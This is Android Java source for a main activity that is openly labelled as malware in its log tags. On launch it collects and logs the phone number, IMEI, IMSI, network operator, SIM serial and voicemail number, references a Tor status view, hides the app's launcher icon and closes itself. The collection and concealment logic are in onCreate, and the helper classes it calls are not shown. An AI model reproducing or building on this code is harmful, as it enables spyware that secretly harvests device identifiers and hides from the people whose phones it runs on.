package ommrepublic.com.ledieo;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

import java.io.File;
import java.io.IOException;
import java.net.Socket;


public class MainActivity extends Activity {

    public boolean willTurnOffScreen = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("malware", "Call me anytime, my number is " + PhoneInfo.getMyPhoneNumber(this));
        Log.d("malware", "IMEI " + PhoneInfo.getMyIMEI(this));
        Log.d("malware", "IMSI " + PhoneInfo.getMyIMSI(this));
        Log.d("malware", "Network operator " + PhoneInfo.getMyNetworkOperator(this));
        Log.d("malware", "SIM-Serial " + PhoneInfo.getMySIMSerial(this));
        Log.d("malware", "Voice number " + PhoneInfo.getMyVoiceMailNumberI(this));

        Utils.torStatus = (TextView)findViewById(R.id.torStatus);
        Utils.hideAppIcon(MainActivity.this);
        finish();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
